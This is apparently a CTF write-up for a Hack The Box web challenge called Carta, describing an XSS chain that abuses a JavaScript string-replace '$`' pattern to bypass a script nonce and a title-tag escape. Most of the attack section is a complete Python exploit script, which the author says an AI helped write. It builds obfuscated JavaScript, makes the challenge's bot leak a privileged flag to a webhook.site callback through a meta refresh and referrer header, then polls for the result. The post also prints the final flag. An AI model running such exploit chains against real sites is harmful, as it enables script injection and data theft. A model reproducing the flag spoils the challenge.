
![](https://cdn-images-1.medium.com/max/1000/1*_vJNjToKwv5__zh1dum8Rg.png)

#### Challenge Scenario

---

A digital-to-physical postcard service helping you bridge the gap between pixels and paper. From the neon lights of Tokyo to the romantic canals of Venice, some secrets are harder to seal than an envelope. Can you find the message hidden between the lines?

check the website

you would know the key of this room is xss after checking the source code

![](https://cdn-images-1.medium.com/max/1000/1*BYOdwde9PMz_llsNDFNyNw.png)

> **line.replace(`{{ ${key} }}`, value)**

here,the value at replacement was controllable

so, we can use $` to compelete the content before and escape() wont`t care about $ and `

so it will be like 

<script nonce={{ nonce }}>let secret = “{{ secret }}”;</script>(usual time)

=>

**nonce = N  
secret = “$;EVIL;//”`** 

=>
<script nonce=N>let secret = “<script nonce=N>let secret = “;**_EVIL()_**;//”;</script>


![](https://cdn-images-1.medium.com/max/1000/1*Yc2yl1T84yFhxXsVlN5M-Q.png)

then

we found it get name form req.quetry without any coding

and 'title' was RCDATA and CSP won`t care about it

![](https://cdn-images-1.medium.com/max/1000/1*MApuO1rQsYaYoZHeTFSl6w.png)

finally we need use the bot to bypass the local restriction to help us get the flag

![](https://cdn-images-1.medium.com/max/1000/1*tC0rCC61Mij-bP0hHB2MWA.png)

here is the py to help you get the flag

> #!/usr/bin/env python3  
> “””HTB Carta — full chain: $` injection -> bot fetch -> privileged flag exfil”””  
> import urllib.request, urllib.parse, json, time

> BASE = “[http://t](http://154.57.164.82:31317)arget:port" # ← change here

> # ── 1. 公网回调通道 ──  
> uuid = json.loads(urllib.request.urlopen(  
>  urllib.request.Request(“[https://webhook.site/token](https://webhook.site/token)", method=’POST’),  
>  timeout=15).read())[“uuid”]  
> CB = f”[https://webhook.site/{uuid](https://webhook.site/%7Buuid)}"  
> print(f”[*] webhook: {CB}”)

> # ── 2. 外带载荷（用于 destinations 的 name 注入）──  
> # </title>逃逸 + 解锁完整URL外带 + 顶级导航(CSP管不着)  
> P = (“</title><meta name=’referrer’ content=’unsafe-url’>”  
>  f”<meta http-equiv=’refresh’ content=’0;url={CB}/priv’>”)

> # ── 3. evil JS — — 全程无引号，String.fromCharCode 构建 ──  
> # ⚠ 三个生死细节:  
> # a) headers 计算键名必须 [String.fromCharCode(..)] 带方括号，丢括号=语法错误=整段script不执行  
> # b) 必须带 Content-Type 头 + body，否则 express.urlencoded 不解析 → 服务端 destructure undefined → 500  
> # c) 外带载荷里的引号靠 charCode 传递，绕开 escape() 与 URL 编码双重雷区  
> fc = lambda s: “,”.join(str(ord(c)) for c in s)  
> evil = (  
>  “fetch(String.fromCharCode(%s),{method:String.fromCharCode(%s),”  
>  “headers:{[String.fromCharCode(%s)]:String.fromCharCode(%s),”  
>  “[String.fromCharCode(%s)]:String.fromCharCode(%s)},”  
>  “body:String.fromCharCode(%s)})”  
>  “.then(function(){location=String.fromCharCode(%s)})” # /ok: fetch成功信标  
>  “.catch(function(){location=String.fromCharCode(%s)})” # /fail: fetch失败信标  
> ) % (fc(‘/report’), fc(‘POST’),  
>  fc(‘Content-Type’), fc(‘application/x-www-form-urlencoded’),  
>  fc(‘x-carta-auth-key’), fc(P),  
>  fc(‘path=x’), fc(CB+’/ok’), fc(CB+’/fail’))

> # ── 4. $` 注入武器 ──  
> secret = “$`;” + evil + “;//”  
> path = “postcard?recipient=pwn&secret=” + urllib.parse.quote(secret, safe=’’)

> # ── 5. 触发 ──  
> req = urllib.request.Request(BASE + “/report”,  
>  data=urllib.parse.urlencode({“path”: path}).encode(), method=’POST’)  
> print(f”[*] report: {urllib.request.urlopen(req, timeout=20).status}”)

> # ── 6. 收割 ──  
> print(“[*] waiting for bot…”); time.sleep(20)  
> d = json.loads(urllib.request.urlopen(  
>  f”[https://webhook.site/token/{uuid}/requests?page=1](https://webhook.site/token/%7Buuid%7D/requests?page=1)", timeout=15).read())  
> for r in d.get(“data”, []):  
>  ref = {str(k).lower(): str(v) for k, v in (r.get(“headers”) or {})}.get(“referer”, “”)  
>  print(f” {r.get(‘url’,’’)[:80]}”)  
>  if “flag” in ref.lower():  
>  print(“\n[★] FLAG:”, urllib.parse.unquote(ref))

it might make mistake because ai didn`t make any adapt to the data back from webhook

![](https://cdn-images-1.medium.com/max/1000/1*fRiZLLm8yLxlN1XNDfXS_Q.png)

but you can check check the webhook with the url it gives you

![](https://cdn-images-1.medium.com/max/1000/1*mcadQG71MpBAM0zEwMs5fg.png)

> [**_http://localhost:3000/destinations?name=%3C%2Ftitle%3E%3Cmeta%20name%3D%27referrer%27%20content%3D%27unsafe-url%27%3E%3Cmeta%20http-equiv%3D%27refresh%27%20content%3D%270%3Burl%3Dhttps%3A%2F%2Fwebhook.site%2F8aa888a4-c13e-4b14-9ead-be356ea21535%2Fpriv%27%3E&flag=HTB%7BWH3N_N0NC3S_W4ND3R_TH3_R3F_W1LL_SCR34M%7D_**](http://localhost:3000/destinations?name=%3C%2Ftitle%3E%3Cmeta%20name%3D%27referrer%27%20content%3D%27unsafe-url%27%3E%3Cmeta%20http-equiv%3D%27refresh%27%20content%3D%270%3Burl%3Dhttps%3A%2F%2Fwebhook.site%2F8aa888a4-c13e-4b14-9ead-be356ea21535%2Fpriv%27%3E&flag=HTB%7BWH3N_N0NC3S_W4ND3R_TH3_R3F_W1LL_SCR34M%7D)

yes,we got the flag finally

HTB{WH3N_N0NC3S_W4ND3R_TH3_R3F_W1LL_SCR34M}